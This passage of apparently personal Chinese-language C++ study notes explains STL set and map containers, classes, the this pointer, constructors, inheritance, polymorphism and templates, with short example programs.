<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">内部元素有序排列，新元素插入的位置取决于它的值，查找速度快</span><br><span class="line">支持通过键值实现快速读取</span><br><span class="line">不可以使用at.(pos)或[]操作符</span><br><span class="line">不可以直接修改容器中的值，如果希望修改一个元素值，必须先删除原有的元素，再插入新的元素</span><br><span class="line">multiset支持一个键值多次出现</span><br></pre></td></tr></table></figure>

<h3 id="构建set容器"><a href="#构建set容器" class="headerlink" title="构建set容器"></a>构建set容器</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// set容器构造函数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printset</span><span class="params">(<span class="type">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_constructor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    set&lt;<span class="type">int</span>&gt; s1; <span class="comment">// 构造了一个空的容器，默认使用小于比较器（元素是从小到大排序）</span></span><br><span class="line">    set&lt;<span class="type">int</span>, less&lt;<span class="type">int</span>&gt;&gt; s2; <span class="comment">// 构造了一个空的容器，使用自定义的小于比较器</span></span><br><span class="line">    set&lt;<span class="type">int</span>, greater&lt;<span class="type">int</span>&gt;&gt; s3; <span class="comment">// 构造了一个空的容器，使用自定义的大于比较器</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> nArr[<span class="number">5</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> &#125;;</span><br><span class="line">    <span class="function">set&lt;<span class="type">int</span>&gt; <span class="title">set4</span><span class="params">(nArr, nArr + <span class="number">5</span>)</span></span>; <span class="comment">// 构造了一个容器，并将数组中的元素添加到容器中</span></span><br><span class="line"></span><br><span class="line">    for_each(set4.<span class="built_in">begin</span>(), set4.<span class="built_in">end</span>(), printset); <span class="comment">// 输出容器中的元素 </span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set_constructor</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>for_each在algorithm头文件中，这个头文件实现了很多STL的算法</p>
<h3 id="方法-2"><a href="#方法-2" class="headerlink" title="方法"></a>方法</h3><h4 id="insert"><a href="#insert" class="headerlink" title="insert()"></a>insert()</h4><p>insert()函数可以在set容器中插入值，但是不能插入重复的值，如果插入了重复的值会被删掉</p>
<img src="/2024/07/18/STL/image-20240919150737674.png" alt="image-20240919150737674" style="zoom:50%;">

<img src="/2024/07/18/STL/image-20240919150824117.png" alt="image-20240919150824117" style="zoom:50%;">

<p>使用数组进行插入</p>
<p>插入后的值在s1中仍然是有序的</p>
<img src="/2024/07/18/STL/image-20240919151152191.png" alt="image-20240919151152191" style="zoom:50%;">

<h4 id="erase"><a href="#erase" class="headerlink" title="erase()"></a>erase()</h4><p>删除set容器中的值</p>
<img src="/2024/07/18/STL/image-20240919151520353.png" alt="image-20240919151520353" style="zoom:50%;">

<p>使用迭代器删除</p>
<p>删除迭代器指向位置的元素</p>
<img src="/2024/07/18/STL/image-20240919151735724.png" alt="image-20240919151735724" style="zoom:50%;">

<p>删除两个迭代器指向之间的元素</p>
<p>删除区间为[it2, it3)之间的值，左闭又开</p>
<img src="/2024/07/18/STL/image-20240919152023872.png" alt="image-20240919152023872" style="zoom:50%;">

<h4 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h4><p>set容器不能直接修改容器内的数据，只能先删除再插入新的元素</p>
<h4 id="find"><a href="#find" class="headerlink" title="find()"></a>find()</h4><p>查找函数，返回的值为迭代器</p>
<img src="/2024/07/18/STL/image-20240920210454030.png" alt="image-20240920210454030" style="zoom:50%;">

<h4 id="count"><a href="#count" class="headerlink" title="count()"></a>count()</h4><p>可以判断一个元素在容器里是否存在，对于multiset来说可以知道制定的元素有几个</p>
<img src="/2024/07/18/STL/image-20240920211201726.png" alt="image-20240920211201726" style="zoom:50%;">

<h2 id="map-multimap-容器"><a href="#map-multimap-容器" class="headerlink" title="map &#x2F; multimap 容器"></a>map &#x2F; multimap 容器</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">底层使用红黑树实现</span><br><span class="line">元素包含两部分（key, value）,key和value可以是任意类型</span><br><span class="line">根据元素的key自动排序，因此根据元素的key进行定位很快，但根据value定位很慢</span><br><span class="line">不能直接改变key，可以通过[]操作符直接存取元素的值</span><br><span class="line">map中不允许key相同的元素，multimap允许key相同的元素</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">mutimap&lt;<span class="type">int</span>, string, less&lt;<span class="type">int</span>&gt;&gt; ms;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>c++</title>
    <url>/2024/02/28/c-1/</url>
    <content><![CDATA[<h1 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h1><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><h3 id="封装-1"><a href="#封装-1" class="headerlink" title="封装"></a>封装</h3><p>将函数定义到结构体内部，就是封装</p>
<h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>带有函数的结构体称为类</p>
<h3 id="成员函数"><a href="#成员函数" class="headerlink" title="成员函数"></a>成员函数</h3><p>结构体里面的函数，称为成员函数</p>
<h3 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a>this关键字</h3><p>当在一个类中，有一个成员函数</p>
<span id="more"></span>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MyStruct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	<span class="type">int</span> b;</span><br><span class="line">	<span class="type">int</span> c;</span><br><span class="line">	<span class="type">int</span> d;</span><br><span class="line">	<span class="type">int</span> <span class="title function_">init</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c, <span class="type">int</span> d)</span></span><br><span class="line">	&#123;</span><br><span class="line">		a = a;</span><br><span class="line">		b = b;</span><br><span class="line">		c = c;</span><br><span class="line">		d = d;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当用<code>a=a</code>时，编译器不能知道a是参数a还是类中的a。</p>
<p>所以用this关键字</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MyStruct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	<span class="type">int</span> b;</span><br><span class="line">	<span class="type">int</span> c;</span><br><span class="line">	<span class="type">int</span> d;</span><br><span class="line">	<span class="type">int</span> <span class="title function_">init</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c, <span class="type">int</span> d)</span></span><br><span class="line">	&#123;</span><br><span class="line">		this-&gt;a = a;</span><br><span class="line">		this-&gt;b = b;</span><br><span class="line">		this-&gt;c = c;</span><br><span class="line">		this-&gt;d = d;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为this关键字指向的是结构体的首地址，所以this-&gt;a就指的是这个成员函数所在的类中的一个成员变量，而不是成员函数中的参数</p>
<p>总结：1.this指针时编译器默认传入的，通常会使用ECX寄存器进行传递</p>
<p>2.成员函数都有this指针，无论是否使用，都会有这个指针</p>
<p>3.this指针不能做加减运算，也不能被重新赋值</p>
<p>4.this指针不占用结构体的宽度</p>
<h2 id="构造函数与析构函数"><a href="#构造函数与析构函数" class="headerlink" title="构造函数与析构函数"></a>构造函数与析构函数</h2><h3 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h3><p>构造函数不能有返回值，构造函数的名字跟类名相同</p>
<p>有构造函数时，当创建一个对象时，构造函数会直接被调用</p>
<p><strong>总结：</strong></p>
<p>1.与类名同名并且没有返回值</p>
<p>2.创建对象时执行，主要用于初始化</p>
<p>3.可以有多个相同的构造函数，最好是有一个无参的，称为函数重载，其他的函数也可以重载</p>
<p>4.编译器不需求必须提供，但是提供时必须不能加返回值</p>
<h3 id="析构函数"><a href="#析构函数" class="headerlink" title="析构函数"></a>析构函数</h3><p>析构函数也不允许写返回值类型，析构函数只能写一个，不能重载，并且必须无参，不能带参数</p>
<p>构造函数是创建对象的时候执行，而析构函数是当这个对象被销毁时才执行<br>也就是当函数要return返回值时，析构函数会被执行</p>
<p><strong>总结：</strong></p>
<p>1.只能有一个析构函数，不能重载</p>
<p>2.不能带任何参数</p>
<p>3.不能带返回值</p>
<p>4.主要用于清理工作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">int</span> age;</span><br><span class="line">	<span class="type">int</span> level;</span><br><span class="line">	<span class="type">char</span>* arr;</span><br><span class="line">	</span><br><span class="line">	Person(<span class="type">int</span> age, <span class="type">int</span> level)</span><br><span class="line">	&#123;</span><br><span class="line">		this-&gt;age = age;</span><br><span class="line">		this-&gt;level = level;</span><br><span class="line">		arr = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	~Person()</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;析构函数执行了...&quot;</span>);</span><br><span class="line">		<span class="built_in">free</span>(arr)</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 其他函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>5.编译器不要求必须提供</p>
<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>有一个Teacher类，一个Person类。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">int</span> age;</span><br><span class="line">	<span class="type">int</span> gender;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Teacher</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">int</span> age;</span><br><span class="line">	<span class="type">int</span> gender;</span><br><span class="line">	<span class="type">int</span> level;</span><br><span class="line">	<span class="type">int</span> teacherID;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现Teacher类中有两个和Person类中是一样的，为了减少代码的重复，可以让Teacher继承Person的一些性质（age、gender）。也就是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Teacher</span>:</span>Person</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> level;</span><br><span class="line">	<span class="type">int</span> teacherID;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里，Person类称为父类或基类；Teacher类称为子类或者派生类</p>
<p><strong>但是，</strong>当父类和子类中有相同的数据时，比如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">int</span> age;</span><br><span class="line">	<span class="type">int</span> gender;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Teacher</span>:</span>Person</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> age;</span><br><span class="line">	<span class="type">int</span> level;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当Teacher类继承了Person类时，其中的age重复了，但是编译器仍然会给这两个age都开辟空间</p>
<p>当使用时：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	Teacher t;</span><br><span class="line">	t.Person::age = <span class="number">20</span>;			<span class="comment">//这里就是父类Person类中的age</span></span><br><span class="line">	t.age = <span class="number">25</span>;					<span class="comment">//这里就是子类Teacher类中的age</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>继承不仅限于父类</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">X</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	<span class="type">int</span> b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Y</span>:</span>X</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> c;</span><br><span class="line">	<span class="type">int</span> d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">z</span>:</span>Y</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> e;</span><br><span class="line">	<span class="type">int</span> f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当使用时，Z类中能够继承到所有的a,b,c,d</p>
<p><strong>多重继承</strong></p>
<p>与上面类似：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Z</span>:</span>X,Y</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> e;</span><br><span class="line">	<span class="type">int</span> f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多重继承增加了程序的复杂度，不建议使用。</p>
<h2 id="在堆中创建对象"><a href="#在堆中创建对象" class="headerlink" title="在堆中创建对象"></a>在堆中创建对象</h2><p>堆中创建对象的两种方式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Person* p = (Person*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Person)*<span class="number">10</span>);</span><br><span class="line">Person* p = new Person[<span class="number">10</span>];</span><br></pre></td></tr></table></figure>

<p>释放对象占用内存对应的两种方式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">delete[] p;</span><br></pre></td></tr></table></figure>

<p>当使用malloc函数分配空间时，创建对象后不会调用构造函数，使用free()函数后也不会调用析构函数。</p>
<p>当使用new关键字创建对象时，会调用构造函数，并在使用delete释放对象占用内存时会调用析构函数。</p>
<h2 id="面向对象程序设计之封装和继承"><a href="#面向对象程序设计之封装和继承" class="headerlink" title="面向对象程序设计之封装和继承"></a>面向对象程序设计之封装和继承</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:26495)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">private:</span><br><span class="line">    <span class="type">int</span> Age;</span><br><span class="line">    <span class="type">int</span> Gender;</span><br><span class="line">public:</span><br><span class="line">    Person()</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    Person(<span class="type">int</span> Age, <span class="type">int</span> Gender)</span><br><span class="line">    &#123;</span><br><span class="line">        this-&gt;Age = Age;</span><br><span class="line">        this-&gt;Gender = Gender;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// public method</span></span><br><span class="line">    	<span class="comment">// Age</span></span><br><span class="line">    <span class="type">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> Age)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (Age &lt;= <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            this-&gt;Age = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            this-&gt;Age = Age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> this-&gt;Age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    	<span class="comment">//Gender</span></span><br><span class="line">    <span class="type">void</span> <span class="title function_">setGender</span><span class="params">(<span class="type">int</span> Gender)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (Gender &lt;= <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            this-&gt;Gender = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            this-&gt;Gender = Gender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">getGender</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> this-&gt;Gender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span>:</span>public Person</span><br><span class="line">&#123;</span><br><span class="line">private:</span><br><span class="line">    <span class="type">int</span> Level;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">    Teacher()</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    Teacher(<span class="type">int</span> Level, <span class="type">int</span> Age, <span class="type">int</span> Gender):Person(Age, Gender)		 <span class="comment">// 这里如果不在后面加::Person()的话，程序默认会调用Person类中的无参构造函数。</span></span><br><span class="line">    &#123;</span><br><span class="line">        this-&gt;Level = Level;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// public method</span></span><br><span class="line">    	<span class="comment">// Level</span></span><br><span class="line">    <span class="type">void</span> <span class="title function_">setLevel</span><span class="params">(<span class="type">int</span> Level)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (Level &lt;= <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            this-&gt;Level = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            this-&gt;Level = Level;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">getLevel</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> this-&gt;Level;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 创建Teacher对象并传入三个参数</span></span><br><span class="line">    Teacher* A = new Teacher(<span class="number">5</span>, <span class="number">20</span>, <span class="number">1</span>);</span><br><span class="line">    Teacher* B = new Teacher(<span class="number">4</span>, <span class="number">22</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A =&gt; Age:%d,Level:%d,Gender:%d\n&quot;</span>, A-&gt;getAge(), A-&gt;getLevel(), A-&gt;getGender()); <span class="comment">// 使用get方法获取</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;B =&gt; Age:%d,Level:%d,Gender:%d\n&quot;</span>, B-&gt;getAge(), B-&gt;getLevel(), B-&gt;getGender());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用Teacher中的方法和继承的Person中的方法修改对象A和对象B中的数据</span></span><br><span class="line">    A-&gt;setAge(<span class="number">50</span>);</span><br><span class="line">    A-&gt;setLevel(<span class="number">8</span>);</span><br><span class="line">    B-&gt;setAge(<span class="number">45</span>);</span><br><span class="line">    B-&gt;setLevel(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A =&gt; Age:%d,Level:%d,Gender:%d\n&quot;</span>, A-&gt;getAge(), A-&gt;getLevel(), A-&gt;getGender());</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;B =&gt; Age:%d,Level:%d,Gender:%d\n&quot;</span>, B-&gt;getAge(), B-&gt;getLevel(), B-&gt;getGender());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A =&gt; Age:20,Level:5,Gender:1</span><br><span class="line">B =&gt; Age:22,Level:4,Gender:0</span><br><span class="line"></span><br><span class="line">A =&gt; Age:50,Level:8,Gender:1</span><br><span class="line">B =&gt; Age:45,Level:9,Gender:0</span><br></pre></td></tr></table></figure>

<h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Square</span>		//这是一个抽象类，抽象类不能创建对象</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">    virtual <span class="type">float</span> <span class="title function_">CalcSq</span><span class="params">()</span> = <span class="number">0</span>;		<span class="comment">//因为不同的图形有不同的求面积方式，所以这里仅定义一个纯虚函数，然后由子类中重写这个函数</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span> :</span> public Square		<span class="comment">//继承抽象类</span></span><br><span class="line">&#123;</span><br><span class="line">private:</span><br><span class="line">    <span class="type">float</span> r;</span><br><span class="line">public:</span><br><span class="line">    Circle(<span class="type">float</span> r)</span><br><span class="line">    &#123;</span><br><span class="line">        this-&gt;r = r;</span><br><span class="line">    &#125;</span><br><span class="line">    virtual <span class="type">float</span> <span class="title function_">CalcSq</span><span class="params">()</span>			<span class="comment">//重写，这一行必须要和父类中的一样</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3.14</span> * r * r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span> :</span> public Square</span><br><span class="line">&#123;</span><br><span class="line">private:</span><br><span class="line">    <span class="type">float</span> x, y;</span><br><span class="line">public:</span><br><span class="line">    Rectangle(<span class="type">float</span> x, <span class="type">float</span> y)</span><br><span class="line">    &#123;</span><br><span class="line">        this-&gt;x = x;</span><br><span class="line">        this-&gt;y = y;</span><br><span class="line">    &#125;</span><br><span class="line">    virtual <span class="type">float</span> <span class="title function_">CalcSq</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> x * y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">float</span> <span class="title function_">CalcSq</span><span class="params">(Square* S)</span>			<span class="comment">//这里传递父类指针</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> S-&gt;CalcSq();			<span class="comment">//父类指针可指向子类		////这里体现了多态性</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    Circle <span class="title function_">C</span><span class="params">(<span class="number">2.5</span>)</span>;				<span class="comment">//创建一个对象，参数传递r=2.5</span></span><br><span class="line">    Rectangle <span class="title function_">R</span><span class="params">(<span class="number">4.5</span>, <span class="number">10</span>)</span>;·		<span class="comment">//创建一个对象,参数传递x=4.5,y=10</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Circle:\t\t%f\n&quot;</span>, CalcSq(&amp;C));<span class="comment">//调用函数求面积，函数中传递子类的指针，因为float CalcSq(Square* S)，其中传递的父类指针可以指向子类地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Rectangle:\t%f\n&quot;</span>, CalcSq(&amp;R));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="虚函数"><a href="#虚函数" class="headerlink" title="虚函数"></a>虚函数</h3><p><code>&lt;1&gt;</code>虚函数目的是提供一个统一的接口，被继承的子类重载，以多态的形式被调用。<br><code>&lt;2&gt;</code>如果基类中的函数没有任何实现的意义，那么可以定义成纯虚函数：virtual返回类型函数名（参数列表）&#x3D;0；<br><code>&lt;3&gt;</code>含有纯虚函数的类被称为抽象类(abstract class),不能创建对象。<br><code>&lt;4&gt;</code>虚函数可以被直接使用，也可以被子类(sub class)重载以后以多态的形式调用，而纯虚函数必须在子类(sub class)中实现该函数才可以使用。</p>
<h2 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h2><p><img src="/2024/02/28/c-1/image-20240228230826536.png" alt="image-20240228230826536"></p>
<p>运算符重载也就是给之前的运算符重新起个名字，比如重载一个<code>++</code>，使它被使用时一次+5</p>
<p>当然，这个重载仅在这个类中有用，原本的<code>++</code>还是自增1</p>
<h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>使用<code>template &lt;class T&gt;</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">template &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">BubbleSort</span><span class="params">(T arr[], <span class="type">int</span> length)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="type">int</span> j;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; length - i - <span class="number">1</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (arr[j]&gt;arr[j+<span class="number">1</span>])</span><br><span class="line">			&#123;</span><br><span class="line">				T temp = arr[j];</span><br><span class="line">				arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">				arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> arr1[] = &#123; <span class="number">5</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">9</span> &#125;;</span><br><span class="line">	<span class="type">float</span> arr2[] = &#123; <span class="number">5.2</span>,<span class="number">1.1</span>,<span class="number">3.6</span>,<span class="number">2.5</span>,<span class="number">4.9</span>,<span class="number">8.0</span>,<span class="number">9.4</span>,<span class="number">1.52</span>,<span class="number">7.7</span>,<span class="number">8.2</span>,<span class="number">5.9</span>,<span class="number">10.4</span>,<span class="number">6.012</span>,<span class="number">9.5</span> &#125;;</span><br><span class="line">	BubbleSort&lt;<span class="type">int</span>&gt;(arr1, <span class="keyword">sizeof</span>(arr1)/<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">	BubbleSort&lt;<span class="type">float</span>&gt;(arr2, <span class="keyword">sizeof</span>(arr2)/<span class="keyword">sizeof</span>(<span class="type">float</span>));</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

